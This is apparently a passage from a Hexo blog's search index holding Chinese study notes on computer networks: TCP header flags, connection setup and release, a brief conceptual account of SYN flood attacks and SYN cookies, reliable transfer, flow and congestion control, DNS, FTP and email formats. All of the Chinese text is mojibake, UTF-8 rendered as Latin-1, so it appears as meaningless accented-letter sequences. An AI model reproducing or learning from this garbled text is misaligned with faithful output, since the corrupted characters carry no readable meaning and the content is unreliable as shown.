é€çš„æŠ¥æ–‡æ®µéƒ½å¿…é¡»æŠŠACKç½®ä¸º1ã€‚</p></li><li><p>æ¨é€ä½PSHï¼šPSH&#x3D;1æ—¶ï¼Œæ¥æ”¶æ–¹å°½å¿«äº¤ä»˜æ¥æ”¶åº”ç”¨è¿›ç¨‹ï¼Œä¸å†ç­‰åˆ°ç¼“å­˜å¡«æ»¡å†å‘ä¸Šäº¤ä»˜ã€‚</p></li><li><p>å¤ä½RSTï¼šRST&#x3D;1æ—¶ï¼Œè¡¨æ˜TCPè¿æ¥ä¸­å‡ºç°ä¸¥é‡å·®é”™ï¼Œå¿…é¡»é‡Šæ”¾è¿æ¥ï¼Œç„¶åå†é‡æ–°å»ºç«‹ä¼ è¾“é“¾æ¥ã€‚</p></li><li><p>åŒæ­¥ä½SYNï¼šSYN&#x3D;1æ—¶ï¼Œè¡¨æ˜æ˜¯ä¸€ä¸ªè¿æ¥è¯·æ±‚&#x2F;è¿æ¥æ¥å—æŠ¥æ–‡ã€‚</p></li><li><p>ç»ˆæ­¢ä½FINï¼šFIN&#x3D;1æ—¶ï¼Œè¡¨æ˜æ­¤æŠ¥æ–‡æ®µå‘é€æ–¹æ•°æ®å·²å‘å®Œï¼Œè¦æ±‚é‡Šæ”¾è¿æ¥ã€‚</p></li></ul><h1 id="tcpè¿æ¥ç®¡ç†"><a href="#TCPè¿æ¥ç®¡ç†" class="headerlink" title="TCPè¿æ¥ç®¡ç†"></a>TCPè¿æ¥ç®¡ç†</h1><p>TCPè¿æ¥ä¼ è¾“çš„ä¸‰ä¸ªé˜¶æ®µï¼š</p><p>è¿æ¥å»ºç«‹&#x3D;ã€‹æ•°æ®ä¼ è¾“&#x3D;ã€‹è¿æ¥é‡Šæ”¾</p><h2 id="tcpè¿æ¥å»ºç«‹"><a href="#TCPè¿æ¥å»ºç«‹" class="headerlink" title="TCPè¿æ¥å»ºç«‹"></a>TCPè¿æ¥å»ºç«‹</h2><p>é‡‡ç”¨ä¸‰æ¬¡æ¡æ‰‹å»ºç«‹TCPè¿æ¥</p><p><img src="http://cdn.clown2024.cn/202407151537885.png" alt="image-20240305225606569"></p><blockquote><p>seqæ˜¯åºå·ï¼Œackæ˜¯ç¡®è®¤å·</p></blockquote><h2 id="synæ´ªæ³›æ”»å‡»"><a href="#SYNæ´ªæ³›æ”»å‡»" class="headerlink" title="SYNæ´ªæ³›æ”»å‡»"></a>SYNæ´ªæ³›æ”»å‡»</h2><p>SYNæ´ªæ³›æ”»å‡»å‘ç”Ÿåœ¨OSIç¬¬å››å±‚ï¼Œè¿™ç§æ–¹å¼åˆ©ç”¨TCPåè®®çš„ç‰¹æ€§ï¼Œå°±æ˜¯ä¸‰æ¬¡æ¡æ‰‹ã€‚æ”»å‡»è€…å‘é€TCP SYNï¼ŒSYNæ˜¯TCPä¸‰æ¬¡æ¡æ‰‹ä¸­çš„ç¬¬ä¸€ä¸ªæ•°æ®åŒ…ï¼Œè€Œå½“æœåŠ¡å™¨è¿”å›ACKåï¼Œè¯¥æ”»å‡»è€…å°±ä¸å¯¹å…¶è¿›è¡Œå†ç¡®è®¤ï¼Œé‚£è¿™ä¸ªTCPè¿æ¥å°±å¤„äºæŒ‚èµ·çŠ¶æ€ï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„åŠè¿æ¥çŠ¶æ€ï¼ŒæœåŠ¡å™¨æ”¶ä¸åˆ°å†ç¡®è®¤çš„è¯ï¼Œè¿˜ä¼šé‡å¤å‘é€ACKç»™æ”»å‡»è€…ã€‚è¿™æ ·æ›´åŠ ä¼šæµªè´¹æœåŠ¡å™¨çš„èµ„æºã€‚æ”»å‡»è€…å°±å¯¹æœåŠ¡å™¨å‘é€éå¸¸å¤§é‡çš„è¿™ç§TCPè¿æ¥ï¼Œç”±äºæ¯ä¸€ä¸ªéƒ½æ²¡æ³•å®Œæˆä¸‰æ¬¡æ¡æ‰‹ï¼Œæ‰€ä»¥åœ¨æœåŠ¡å™¨ä¸Šï¼Œè¿™äº›TCPè¿æ¥ä¼šå› ä¸ºæŒ‚èµ·çŠ¶æ€è€Œæ¶ˆè€—CPUå’Œå†…å­˜ï¼Œæœ€åæœåŠ¡å™¨å¯èƒ½æ­»æœºï¼Œå°±æ— æ³•ä¸ºæ­£å¸¸ç”¨æˆ·æä¾›æœåŠ¡äº†ã€‚</p><p><strong>é˜²èŒƒSYNæ´ªæ³›æ”»å‡»çš„æ–¹æ³•</strong></p><p>å¯ä»¥é€šè¿‡è®¾ç½®SYN cookie</p><h2 id="tcpçš„è¿æ¥é‡Šæ”¾"><a href="#TCPçš„è¿æ¥é‡Šæ”¾" class="headerlink" title="TCPçš„è¿æ¥é‡Šæ”¾"></a>TCPçš„è¿æ¥é‡Šæ”¾</h2><p>é‡‡ç”¨å››æ¬¡æ¡æ‰‹</p><p><img src="http://cdn.clown2024.cn/202407151537886.png" alt="image-20240305230921528"></p><blockquote><p>ç­‰å¾…2MSLçš„ç›®çš„æ˜¯ä¸ºäº†èƒ½å¤Ÿå½»åº•å…³é—­è¿æ¥</p><p>å› ä¸ºè‹¥Bæ²¡æœ‰æ”¶åˆ°ç¡®è®¤æŠ¥æ–‡æ®µä¼šåœ¨2MSLå†…é‡æ–°å‘é€ç¬¬ä¸‰ä¸ªæŠ¥æ–‡æ®µï¼Œè‹¥Aç›´æ¥å…³é—­äº†å°±ä¼šæ”¶ä¸åˆ°é‡ä¼ çš„æŠ¥æ–‡æ®µï¼ŒBå°±ä¼šä¸€ç›´é‡ä¼ å¯¼è‡´è¿æ¥æ— æ³•å®Œå…¨å…³é—­</p></blockquote><h1 id="tcpå¯é ä¼ è¾“"><a href="#TCPå¯é ä¼ è¾“" class="headerlink" title="TCPå¯é ä¼ è¾“"></a>TCPå¯é ä¼ è¾“</h1><p>å¯é ä¼ è¾“å°±æ˜¯ä¿è¯æ¥æ”¶æ–¹è¿›ç¨‹ä»ç¼“å­˜åŒºè¯»å‡ºçš„å­—èŠ‚æµä¸å‘é€æ–¹å‘å‡ºçš„å­—èŠ‚æµæ˜¯å®Œå…¨ä¸€æ ·çš„ã€‚</p><p>å®ç°å¯é ä¼ è¾“çš„æœºåˆ¶ï¼š</p><ol><li><p><strong>æ ¡éªŒ</strong></p><p>å¢åŠ ä¼ªé¦–éƒ¨ä¸UDPæ ¡éªŒä¸€æ ·ï¼Œ</p></li><li><p><strong>åºå·</strong></p><p>ä¸€ä¸ªå­—èŠ‚å ä¸€ä¸ªåºå·ï¼›åºå·å­—æ®µæŒ‡çš„æ˜¯ä¸€ä¸ªæŠ¥æ–‡çš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„åºå·</p><p>ä¸€ä¸ªæŠ¥æ–‡æ®µçš„å­—èŠ‚æ•°å–å†³äºMTU(é“¾è·¯å±‚çš„æœ€å¤§ä¼ è¾“å•å…ƒ)</p></li><li><p><strong>ç¡®è®¤</strong></p><p><img src="http://cdn.clown2024.cn/202407151537887.png" alt="image-20240306003306167"></p><p>è¿™é‡Œå‘é€æ–¹è¦åœ¨æ”¶åˆ°ç¡®è®¤æŠ¥æ–‡æ®µä¹‹åæ‰ä¼šå°†æŠ¥æ–‡æ®µä»ç¼“å­˜ä¸­åˆ å»ï¼Œå› ä¸ºå¯èƒ½éœ€è¦é‡ä¼ ã€‚</p><p>å¦‚æœ456å’Œ78ä¸€èµ·å‘é€è¿‡å»ï¼Œåªæ”¶åˆ°äº†78ï¼Œæ¥å—æ–¹å°±ä¼šè¿”å›ackä¸º4çš„æŠ¥æ–‡æ®µï¼Œå‘é€æ–¹å°±ä¼šé‡ä¼ 456æŠ¥æ–‡æ®µï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151537888.png" alt="image-20240306003639763"></p></li><li><p><strong>é‡ä¼ </strong></p><p>TCPçš„å‘é€æ–¹åœ¨è§„å®šæ—¶é—´å†…æ²¡æœ‰æ”¶åˆ°ç¡®è®¤æŠ¥æ–‡æ®µå°±è¦é‡ä¼ å·²å‘é€çš„æŠ¥æ–‡æ®µï¼›ä¹Ÿå°±æ˜¯è¶…æ—¶é‡ä¼ </p><p>é‡ä¼ æ—¶é—´çš„è®¾ç½®å°±é‡‡ç”¨äº†è‡ªé€‚åº”ç®—æ³•ï¼ŒåŠ¨æ€æ”¹å˜é‡ä¼ æ—¶é—´RTTs(åŠ æƒå¹³å‡å¾€è¿”æ—¶é—´)</p><p>ä¸è¿‡ç­‰å¾…æ—¶é—´è¿‡ä¹…ï¼Œè¿˜æœ‰ä¸€ç§å†—ä½™ACK(å†—ä½™ç¡®è®¤)æ–¹æ³•æ¥æé«˜æ•ˆç‡</p><p><img src="http://cdn.clown2024.cn/202407151537889.png" alt="image-20240306004112025"></p></li></ol><h1 id="tcpæµé‡æ§åˆ¶"><a href="#TCPæµé‡æ§åˆ¶" class="headerlink" title="TCPæµé‡æ§åˆ¶"></a>TCPæµé‡æ§åˆ¶</h1><p>æµé‡æ§åˆ¶ï¼šä¹Ÿå°±æ˜¯æ§åˆ¶å‘é€é€Ÿç‡ï¼Œä½¿æ¥æ”¶æ–¹èƒ½å¤Ÿå®Œå…¨æ¥æ”¶æ•°æ®</p><p>TCPé‡‡ç”¨æ»‘åŠ¨çª—å£æœºåˆ¶å®ç°æµé‡æ§åˆ¶</p><p>åœ¨é€šä¿¡è¿‡ç¨‹ä¸­ï¼Œæ¥æ”¶æ–¹æ ¹æ®è‡ªå·±æ¥æ”¶ç¼“å­˜çš„å¤§å°ï¼ŒåŠ¨æ€åœ°è°ƒæ•´å‘é€æ–¹çš„å‘é€çª—å£å¤§å°ï¼Œå³æ¥æ”¶çª—å£rwnd(æ¥æ”¶æ–¹è®¾ç½®ç¡®è®¤æŠ¥æ–‡æ®µçš„çª—å£å­—æ®µæ¥å°†rwndé€šçŸ¥ç»™å‘é€æ–¹)ï¼Œå‘é€æ–¹çš„å‘é€çª—å£å–æ¥æ”¶çª—å£rwndå’Œæ‹¥å¡çª—å£cwndçš„æœ€å°å€¼ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151537890.png" alt="image-20240306132247748"></p><h1 id="tcpæ‹¥å¡æ§åˆ¶"><a href="#TCPæ‹¥å¡æ§åˆ¶" class="headerlink" title="TCPæ‹¥å¡æ§åˆ¶"></a>TCPæ‹¥å¡æ§åˆ¶</h1><p>å‡ºç°æ‹¥å¡çš„æ¡ä»¶ï¼šå¯¹èµ„æºéœ€æ±‚æ€»å’Œ&gt;å¯ç”¨èµ„æº</p><p>æ‹¥å¡æ§åˆ¶å°±æ˜¯é˜²æ­¢è¿‡å¤šçš„æ•°æ®æ³¨å…¥åˆ°ç½‘ç»œä¸­ã€‚(å…¨å±€æ€§æ§åˆ¶)</p><p>æ‹¥å¡æ§åˆ¶è¿˜æœ‰å››ç§ç®—æ³•ï¼šæ»¡å¼€å§‹ã€æ‹¥å¡é¿å…ã€å¿«é‡ä¼ ã€å¿«æ¢å¤</p><p><strong>ç°åœ¨å…ˆå‡å®šä¸€ä¸‹æƒ…å†µæ¥å­¦ä¹ è¿™å››ç§ç®—æ³•ï¼š</strong></p><ol><li><p>æ•°æ®å•æ–¹å‘ä¼ é€ï¼Œè€Œå¦ä¸€ä¸ªæ–¹å‘åªä¼ é€ç¡®è®¤(å°±æ˜¯æ²¡æœ‰æå¸¦ç¡®è®¤ï¼Œä¹Ÿå°±æ˜¯é™„åŠ æ•°æ®)</p></li><li><p>æ¥æ”¶æ–¹æ€»æ˜¯æœ‰è¶³å¤Ÿå¤§çš„ç¼“å­˜ç©ºé—´ï¼Œå› è€Œå‘é€çª—å£å¤§å°å–å†³äºæ‹¥å¡ç¨‹åº¦</p><p>å‘é€çª—å£&#x3D;Min{æ¥æ”¶çª—å£rwndï¼Œæ‹¥å¡çª—å£cwnd}</p><p>æ¥æ”¶çª—å£ï¼šæ¥æ”¶æ–¹æ ¹æ®æ¥å—ç¼“å­˜è®¾ç½®çš„å€¼ï¼Œå¹¶å‘ŠçŸ¥ç»™å‘é€æ–¹ï¼Œåæ˜ æ¥æ”¶æ–¹å®¹é‡ã€‚<br>æ‹¥å¡çª—å£ï¼šå‘é€æ–¹æ ¹æ®è‡ªå·±ä¼°ç®—çš„ç½‘ç»œæ‹¥å¡ç¨‹åº¦è€Œè®¾ç½®çš„çª—å£å€¼ï¼Œåæ˜ ç½‘ç»œå½“å‰å®¹é‡ã€‚</p></li></ol><h2 id="æ…¢å¼€å§‹å’Œæ‹¥å¡é¿å…"><a href="#æ…¢å¼€å§‹å’Œæ‹¥å¡é¿å…" class="headerlink" title="æ…¢å¼€å§‹å’Œæ‹¥å¡é¿å…"></a>æ…¢å¼€å§‹å’Œæ‹¥å¡é¿å…</h2><p><img src="http://cdn.clown2024.cn/202407151537891.png" alt="image-20240306134517263"></p><p>æ…¢å¼€å§‹å°±æ˜¯é€æ¸å¢åŠ æ³¨å…¥çš„æŠ¥æ–‡æ®µï¼Œåœ¨è¾¾åˆ°sshresh(æ…¢å¼€å§‹é—¨é™)ä¹‹å‰ä»¥2çš„æŒ‡æ•°å€ä¸Šå‡ï¼Œç¬¬ä¸€æ¬¡ä¼ è¾“1ï¼Œç¬¬äºŒæ¬¡åˆ™2ï¼Œç¬¬ä¸‰æ¬¡åˆ™4ï¼Œä»¥æ­¤ç±»æ¨ï¼Œè¿™é‡Œåœ¨æ”¶åˆ°ç¡®è®¤æŠ¥æ–‡æ®µä¹‹åå°±ä¼šç«‹åˆ»æ”¹å˜æ‹¥å¡çª—å£å¤§å°ï¼›åˆ°è¾¾é—¨é™ä¹‹åå°±çº¿æ€§å¢é•¿ï¼Œè¿™é‡Œçš„å›¾å°±é€æ¬¡åŠ ä¸€ã€‚</p><p>æ£€æµ‹åˆ°ç½‘ç»œæ‹¥å¡ä¹‹åï¼Œcwnd(æ‹¥å¡çª—å£)å°±ç›´æ¥é™åˆ°ä¸€ï¼Œç„¶åé‡å¤å‰é¢çš„è¿‡ç¨‹ï¼Œä½†æ˜¯å”¯ä¸€æ”¹å˜çš„å°±æ˜¯sshreshï¼Œæ˜¯åœ¨æ£€æµ‹åˆ°ç½‘ç»œæ‹¥å¡æ—¶ï¼Œå°†æ‹¥å¡çª—å£é™¤ä»¥2ä½œä¸ºæ–°çš„sshresh</p><h2 id="å¿«é‡ä¼ å’Œå¿«æ¢å¤"><a href="#å¿«é‡ä¼ å’Œå¿«æ¢å¤" class="headerlink" title="å¿«é‡ä¼ å’Œå¿«æ¢å¤"></a>å¿«é‡ä¼ å’Œå¿«æ¢å¤</h2><p><img src="http://cdn.clown2024.cn/202407151537892.png" alt="image-20240306134721633"></p><p>å¿«é‡ä¼ å°±æ˜¯ä¸Šé¢è¯´åˆ°çš„å†—ä½™ACKï¼Œæ”¶åˆ°ä¸‰ä¸ªé‡å¤çš„ç¡®è®¤ä¹‹åå°±ä¼šæ‰§è¡Œå¿«é‡ä¼ ã€‚</p><p>å¿«é‡ä¼ ä¹‹åæ‰§è¡Œçš„å°±æ˜¯å¿«æ¢å¤ï¼Œå¿«æ¢å¤ä¸ä¼šç«‹åˆ»é™åˆ°æ‹¥å¡çª—å£ä¸º1ï¼Œè€Œæ˜¯é™åˆ°æ–°çš„é—¨é™å€¼ï¼Œé—¨é™å€¼çš„å¤§å°å°±æ˜¯æ£€æµ‹åˆ°ä¸‰ä¸ªé‡å¤ç¡®è®¤æ—¶çš„æ‹¥å¡çª—å£é™¤ä»¥2.</p>]]></content>
      
      
      <categories>
          
          <category> åŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è®¡ç½‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®¡ç®—æœºç½‘ç»œå­¦ä¹ -2</title>
      <link href="/2024/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-2/"/>
      <url>/2024/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-2/</url>
      
        <content type="html"><![CDATA[<h1 id="åº”ç”¨å±‚"><a href="#åº”ç”¨å±‚" class="headerlink" title="åº”ç”¨å±‚"></a>åº”ç”¨å±‚</h1><p>åº”ç”¨å±‚å¯¹åº”ç”¨ç¨‹åºçš„é€šä¿¡æä¾›æœåŠ¡ã€‚</p><p><strong>åº”ç”¨å±‚åè®®å®šä¹‰:</strong></p><ul><li><p>åº”ç”¨è¿›ç¨‹äº¤æ¢çš„æŠ¥æ–‡ç±»å‹ï¼Œè¯·æ±‚è¿˜æ˜¯å“åº”?</p></li><li><p>å„ç§æŠ¥æ–‡ç±»å‹çš„è¯­æ³•ï¼Œå¦‚æŠ¥æ–‡ä¸­çš„å„ä¸ªå­—æ®µåŠå…¶è¯¦ç»†æè¿°å­—æ®µçš„è¯­ä¹‰ï¼Œå³åŒ…å«åœ¨å­—æ®µä¸­çš„ä¿¡æ¯çš„å«ä¹‰ã€‚</p></li><li><p>è¿›ç¨‹ä½•æ—¶ã€å¦‚ä½•å‘é€æŠ¥æ–‡ï¼Œä»¥åŠå¯¹æŠ¥æ–‡è¿›è¡Œå“åº”çš„è§„åˆ™ã€‚</p></li></ul><p><strong>åº”ç”¨å±‚çš„åŠŸèƒ½ï¼š</strong></p><ul><li><p>æ–‡ä»¶ä¼ è¾“ã€è®¿é—®å’Œç®¡ç†    </p></li><li><p>ç”µå­é‚®ä»¶      </p></li><li><p>è™šæ‹Ÿç»ˆç«¯     </p></li><li><p>æŸ¥è¯¢æœåŠ¡å’Œè¿œç¨‹ä½œä¸šç™»å½•</p></li></ul><p><strong>åº”ç”¨å±‚é‡è¦åè®®</strong></p><p> <strong>FTP</strong>ï¼Œ<strong>SMTPã€POP3</strong>ï¼Œ <strong>HTTP</strong>ï¼Œ <strong>DNS</strong></p><p><strong>ç½‘ç»œåº”ç”¨æ¨¡å‹</strong></p><ul><li>å®¢æˆ·&#x2F;æœåŠ¡å™¨æ¨¡å‹ï¼ˆC&#x2F;Sï¼‰</li><li>P2Pæ¨¡å‹ï¼ˆPeer-to-peerï¼‰ä¹Ÿå«å¯¹ç­‰æ¨¡å‹</li></ul><h1 id="dnsç³»ç»Ÿ"><a href="#DNSç³»ç»Ÿ" class="headerlink" title="DNSç³»ç»Ÿ"></a>DNSç³»ç»Ÿ</h1><h2 id="åŸŸå"><a href="#åŸŸå" class="headerlink" title="åŸŸå"></a>åŸŸå</h2><p>åŸŸåä»å·¦åˆ°å³çº§åˆ«é€æ¸å‡é«˜ï¼Œæœ€å³è¾¹çš„å«åšé¡¶çº§åŸŸå</p><p><img src="http://cdn.clown2024.cn/202407151536588.png" alt="image-20240305091606492"></p><p><strong>æ ¹</strong></p><p>æ ¹æŒ‡çš„æ˜¯é¡¶çº§åŸŸåå³è¾¹çš„ä¸€ç‚¹ï¼Œæ‰€ä»¥å®Œæ•´çš„åŸŸåå†™æ³•åº”è¯¥æ˜¯<a href="http://www.xxx.com.,ä»æ ¹åé¢æ‰æ˜¯é¡¶çº§åŸŸå/">www.xxx.com.ï¼Œä»æ ¹åé¢æ‰æ˜¯é¡¶çº§åŸŸå</a></p><p><strong>é¡¶çº§åŸŸå</strong></p><p><img src="http://cdn.clown2024.cn/202407151536590.png" alt="image-20240305091738436"></p><p>åå‘åŸŸåå³é€šè¿‡IPåœ°å€æ¥åå‘è§£æå‡ºåŸŸå</p><p><strong>äºŒçº§åŸŸå</strong></p><p><img src="http://cdn.clown2024.cn/202407151536591.png" alt="image-20240305091920777"></p><p><strong>åŸŸåæ ‘</strong></p><p>åŸŸåå¯ä»¥æœ‰å¾ˆå¤šçº§ï¼Œæ¯”å¦‚å­¦æ ¡çš„åŸŸåå°±æœ‰ä¸‰çº§ã€å››çº§ç­‰ç­‰</p><p><img src="http://cdn.clown2024.cn/202407151536592.png" alt="image-20240305092053637"></p><h2 id="åŸŸåæœåŠ¡å™¨"><a href="#åŸŸåæœåŠ¡å™¨" class="headerlink" title="åŸŸåæœåŠ¡å™¨"></a>åŸŸåæœåŠ¡å™¨</h2><ul><li><p>æœ¬åœ°åŸŸåæœåŠ¡å™¨ï¼šå½“ä¸€ä¸ªä¸»æœºå‘å‡ºDNSæŸ¥è¯¢è¯·æ±‚æ—¶ï¼Œè¿™ä¸ªæŸ¥è¯¢è¯·æ±‚æŠ¥æ–‡å°±å‘ç»™æœ¬åœ°åŸŸåæœåŠ¡å™¨ã€‚</p></li><li><p>æ ¹åŸŸåæœåŠ¡å™¨ï¼šçŸ¥é“æ‰€æœ‰çš„åŸŸåï¼Œå°±æ˜¯çŸ¥é“é¡¶çº§åŸŸåå¯¹åº”é‚£ä¸ªé¡¶çº§åŸŸåæœåŠ¡å™¨ï¼Œåœ¨æœ¬åœ°åŸŸåæœåŠ¡å™¨æ‰¾ä¸åˆ°åŸŸåæ—¶å°±ä¼šå…ˆå»è¯·æ±‚æ ¹åŸŸåæœåŠ¡å™¨</p></li><li><p>é¡¶çº§åŸŸåæœåŠ¡å™¨ï¼šç®¡ç†è¯¥é¡¶çº§åŸŸåæœåŠ¡å™¨æ³¨å†Œçš„æ‰€æœ‰äºŒçº§åŸŸå</p></li><li><p>æƒé™åŸŸåæœåŠ¡å™¨ï¼šè´Ÿè´£ä¸€ä¸ªåŒºçš„åŸŸåæœåŠ¡å™¨</p></li></ul><p>æ€»ä¹‹å°±æ˜¯å‘DNSè¯·æ±‚æ¥æŒ‡æ˜ä¸‹ä¸€æ­¥è¦æŸ¥è¯¢å“ªä¸€ä¸ªDNSæœåŠ¡å™¨ï¼Œè¿™æ˜¯ä¸€ä¸ªç¤ºä¾‹å›¾ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151536593.png" alt="image-20240305093038757"></p><h2 id="åŸŸåè§£æè¿‡ç¨‹"><a href="#åŸŸåè§£æè¿‡ç¨‹" class="headerlink" title="åŸŸåè§£æè¿‡ç¨‹"></a>åŸŸåè§£æè¿‡ç¨‹</h2><p>å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="https://blog.csdn.net/m0_37263637/article/details/85157611">åŸŸååˆ†çº§ä¸åŸŸåè§£æè¿‡ç¨‹(DNS)-CSDNåšå®¢</a></p><p>åŸŸåè§£æåˆ†ä¸ºä¸¤ç§æŸ¥è¯¢ï¼š</p><ul><li><p>é€’å½’æŸ¥è¯¢</p><p><img src="http://cdn.clown2024.cn/202407151536594.png" alt="image-20240305093323157"></p></li><li><p>è¿­ä»£æŸ¥è¯¢</p><p><img src="http://cdn.clown2024.cn/202407151536595.png" alt="image-20240305093347626"></p></li></ul><p>è¿™ä¸¤ç§æŸ¥è¯¢çš„åŒºåˆ«å°±æ˜¯å®¢æˆ·è§’è‰²ä¸åŒï¼Œé€’å½’æ˜¯æ¯ä¸€ç§æœåŠ¡å™¨éƒ½è¦åšæŸ¥è¯¢ç”¨æˆ·ï¼Œè€Œè¿­ä»£å°±ä¸€ç›´æ˜¯æœ¬åœ°åŸŸåæœåŠ¡å™¨åšæŸ¥è¯¢ç”¨æˆ·</p><h2 id="é«˜é€Ÿç¼“å­˜"><a href="#é«˜é€Ÿç¼“å­˜" class="headerlink" title="é«˜é€Ÿç¼“å­˜"></a>é«˜é€Ÿç¼“å­˜</h2><p>è¿™æ˜¯ä¸ºäº†æé«˜DNSæŸ¥è¯¢æ•ˆç‡çš„æ–¹æ³•ï¼Œæ¯”å¦‚æœ€è¿‘æŸ¥è¯¢è¿‡çš„åŸŸåä¼šå­˜æ”¾åœ¨æœ¬åœ°åŸŸåæœåŠ¡å™¨</p><h1 id="æ–‡ä»¶ä¼ é€åè®®"><a href="#æ–‡ä»¶ä¼ é€åè®®" class="headerlink" title="æ–‡ä»¶ä¼ é€åè®®"></a>æ–‡ä»¶ä¼ é€åè®®</h1><ul><li>æ–‡ä»¶ä¼ é€åè®®FTP(FileTransfer Protocol)ï¼šæä¾›ä¸åŒç§ç±»ä¸»æœºç³»ç»Ÿ(ç¡¬ã€è½¯ä»¶ä½“ç³»ç­‰éƒ½å¯ä»¥ä¸åŒ)ä¹‹é—´çš„æ–‡ä»¶ä¼ è¾“èƒ½åŠ›ã€‚</li><li>ç®€å•æ–‡ä»¶ä¼ é€åè®®TFTP(Trivial File Transfer Protocol)</li></ul><h2 id="ftpæœåŠ¡ç«¯å’Œç”¨æˆ·ç«¯"><a href="#FTPæœåŠ¡ç«¯å’Œç”¨æˆ·ç«¯" class="headerlink" title="FTPæœåŠ¡ç«¯å’Œç”¨æˆ·ç«¯"></a>FTPæœåŠ¡ç«¯å’Œç”¨æˆ·ç«¯</h2><blockquote><p> FTPæ˜¯åŸºäºå®¢æˆ·&#x2F;æœåŠ¡å™¨(C&#x2F;S)çš„åè®®ã€‚</p><p>ç”¨æˆ·é€šè¿‡ä¸€ä¸ªå®¢æˆ·æœºç¨‹åºè¿æ¥è‡³åœ¨è¿œç¨‹è®¡ç®—æœºä¸Šè¿è¡Œçš„æœåŠ¡å™¨ç¨‹åºã€‚</p><p>ä¾ç…§ FTPåè®®æä¾›æœåŠ¡ï¼Œè¿›è¡Œæ–‡ä»¶ä¼ é€çš„è®¡ç®—æœºå°±æ˜¯FTPæœåŠ¡å™¨ã€‚</p><p>è¿æ¥FTPæœåŠ¡å™¨ï¼Œéµå¾ªFTPåè®®ä¸æœåŠ¡å™¨ä¼ é€æ–‡ä»¶çš„ç”µè„‘å°±æ˜¯FTPå®¢æˆ·ç«¯</p></blockquote><h2 id="ftpå·¥ä½œåŸç†"><a href="#FTPå·¥ä½œåŸç†" class="headerlink" title="FTPå·¥ä½œåŸç†"></a>FTPå·¥ä½œåŸç†</h2><ul><li><p>ç™»é™†</p><p>çŸ¥é“ftpæœåŠ¡å™¨åœ°å€åæœ‰ä¸¤ç§ç™»é™†æ–¹å¼ï¼Œä¸€ç§æ˜¯ç”¨æˆ·å&amp;å¯†ç ç™»é™†æ–¹å¼ï¼Œå¦ä¸€ç§æ˜¯åŒ¿åç™»é™†</p><blockquote><p>äº’è¿ç½‘ä¸­æœ‰å¾ˆå¤§ä¸€éƒ¨åˆ†FTP æœåŠ¡å™¨è¢«ç§°ä¸ºâ€œåŒ¿åâ€(Anonymous)FTPæœåŠ¡å™¨ã€‚è¿™ç±»æœåŠ¡å™¨çš„ç›®çš„æ˜¯å‘å…¬ä¼—æä¾›æ–‡ä»¶æ‹·è´æœåŠ¡ï¼Œä¸è¦æ±‚ç”¨æˆ·äº‹å…ˆåœ¨è¯¥æœåŠ¡å™¨è¿›è¡Œç™»è®°æ³¨å†Œï¼Œä¹Ÿä¸ç”¨å–å¾—FTPæœåŠ¡å™¨çš„æˆæƒã€‚Anonymous(åŒ¿åæ–‡ä»¶ä¼ è¾“)èƒ½å¤Ÿä½¿ç”¨æˆ·ä¸è¿œç¨‹ä¸»æœºå»ºç«‹è¿æ¥å¹¶ä»¥åŒ¿åèº«ä»½ä»è¿œç¨‹ä¸»æœºä¸Šæ‹·è´æ–‡ä»¶ï¼Œè€Œä¸å¿…æ˜¯è¯¥è¿œç¨‹ä¸»æœºçš„æ³¨å†Œç”¨æˆ·ã€‚ç”¨æˆ·ä½¿ç”¨ç‰¹æ®Šçš„ç”¨æˆ·åâ€œanonymousâ€ç™»é™†FTPæœåŠ¡ï¼Œå°±å¯è®¿é—®è¿œç¨‹ä¸»æœºä¸Šå…¬å¼€çš„æ–‡ä»¶ã€‚è¿™æ ·å¯ä»¥å‡å°‘æœåŠ¡å™¨çš„å‹åŠ›ã€‚</p></blockquote></li></ul><p>FTPä½¿ç”¨TCPå®ç°å¯é ä¼ è¾“</p><p>FTPçš„æœåŠ¡å™¨è¿›ç¨‹åˆ†ä¸ºä¸¤ç§ï¼š</p><ul><li>ä¸€ä¸ªä¸»è¿›ç¨‹ï¼šè´Ÿè´£æ¥æ”¶è¯·æ±‚</li><li>nä¸ªä»å±è¿›ç¨‹ï¼šå»å¤„ç†ç”¨æˆ·è¯·æ±‚</li></ul><p>è¿™æ˜¯ftpä¼ è¾“çš„è¿‡ç¨‹åŠå…¶ä½¿ç”¨çš„ç«¯å£å·ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151536596.png" alt="image-20240305095147480"></p><p>ftpä¼ è¾“çš„æ–‡ä»¶æœ‰ä¸¤ç§æ¨¡å¼ï¼š</p><ul><li>æ–‡æœ¬æ¨¡å¼ï¼šASCIIæ¨¡å¼ï¼Œä»¥æ–‡æœ¬åºåˆ—ä¼ è¾“æ•°æ®</li><li>äºŒè¿›åˆ¶æ¨¡å¼ï¼šBinaryæ¨¡å¼ï¼Œä»¥äºŒè¿›åˆ¶åºåˆ—ä¼ è¾“æ•°æ®</li></ul><h1 id="ç”µå­é‚®ä»¶"><a href="#ç”µå­é‚®ä»¶" class="headerlink" title="ç”µå­é‚®ä»¶"></a>ç”µå­é‚®ä»¶</h1><h2 id="ä¿¡æ¯æ ¼å¼"><a href="#ä¿¡æ¯æ ¼å¼" class="headerlink" title="ä¿¡æ¯æ ¼å¼"></a>ä¿¡æ¯æ ¼å¼</h2><ul><li><p>ä¿¡å°ï¼šä¾‹å¦‚<a href="mailto:&#x78;&#120;&#120;&#x40;&#49;&#x36;&#51;&#46;&#99;&#x6f;&#109;">&#x78;&#120;&#120;&#x40;&#49;&#x36;&#51;&#46;&#99;&#x6f;&#109;</a></p></li><li><p>å†…å®¹</p><ul><li><p>é¦–éƒ¨</p><p><img src="http://cdn.clown2024.cn/202407151536597.png" alt="image-20240305124931354"></p></li><li><p>ä¸»ä½“</p><p>å°±æ˜¯é‚®ä»¶å†…å®¹äº†ã€‚</p></li></ul></li></ul><h2 id="ç»„æˆç»“æ„"><a 